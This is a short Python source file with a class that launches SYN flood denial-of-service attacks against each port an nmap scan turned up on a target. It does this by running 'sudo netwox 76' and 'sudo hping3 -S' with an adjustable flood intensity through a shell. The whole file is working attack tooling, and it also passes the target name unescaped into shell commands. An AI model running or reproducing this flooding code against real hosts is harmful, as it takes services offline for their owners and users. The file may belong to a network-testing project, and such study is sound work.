
from Classes.nmap import nmap_object
from Classes.constants import constants
import subprocess

class Netwox:

    def syn_flood_network(self, nmap_o: nmap_object):
        for port in nmap_o.ports:
            cmd = ('sudo netwox 76 -i %s -p %s -s raw' % (nmap_o.name, port))
            print(cmd)
            #subprocess.call(cmd, shell=True)
            subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
            #  close process

    def syn_flood_attack(self, nmap_o: nmap_object, intensity: int):
        format_intensity = constants.intencity[intensity]
        for port in nmap_o.ports:
            cmd = ('sudo hping3 -S --%s -p %s %s' % (format_intensity, port, nmap_o.name))
            subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
            print(cmd)